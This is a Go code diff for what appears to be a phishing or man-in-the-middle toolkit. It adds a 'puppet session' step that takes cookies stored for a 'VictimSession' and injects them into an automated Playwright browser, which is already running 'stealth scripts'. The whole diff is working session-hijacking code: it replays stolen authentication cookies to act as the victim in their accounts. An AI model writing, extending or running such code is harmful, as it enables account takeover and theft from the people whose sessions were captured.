@@ -178,6 +178,39 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 		log.Warning("[PUPPET] Failed to apply stealth scripts: %v", err)
 	}
 
+	// CRITICAL: Inject existing cookies from previous sessions/triggers
+	if cookieMaps := pm.sessionMap.GetCookies(session.VictimSession); len(cookieMaps) > 0 {
+		log.Info("[PUPPET] Injecting %d existing cookies into puppet session", len(cookieMaps))
+		
+		var playwrightCookies []playwright.OptionalCookie
+		for _, cm := range cookieMaps {
+			cookie := playwright.OptionalCookie{
+				Name:  cm["name"].(string),
+				Value: cm["value"].(string),
+			}
+			if v, ok := cm["domain"].(string); ok { cookie.Domain = playwright.String(v) }
+			if v, ok := cm["path"].(string); ok { cookie.Path = playwright.String(v) }
+			if v, ok := cm["expires"].(float64); ok { cookie.Expires = playwright.Float(v) }
+			if v, ok := cm["httpOnly"].(bool); ok { cookie.HttpOnly = playwright.Bool(v) }
+			if v, ok := cm["secure"].(bool); ok { cookie.Secure = playwright.Bool(v) }
+			// SameSite might need casting or mapping, skipping for safety if not critical, or adding:
+			if v, ok := cm["sameSite"].(string); ok {
+				switch v {
+				case "Strict": cookie.SameSite = playwright.SameSiteAttributeStrict
+				case "Lax": cookie.SameSite = playwright.SameSiteAttributeLax
+				case "None": cookie.SameSite = playwright.SameSiteAttributeNone
+				}
+			}
+			playwrightCookies = append(playwrightCookies, cookie)
+		}
+
+		if err := context.AddCookies(playwrightCookies); err != nil {
+			log.Warning("[PUPPET] Failed to inject cookies: %v", err)
+		} else {
+			log.Debug("[PUPPET] Cookies injected successfully")
+		}
+	}
+
 	// Create page
 	page, err := context.NewPage()
 	if err != nil {
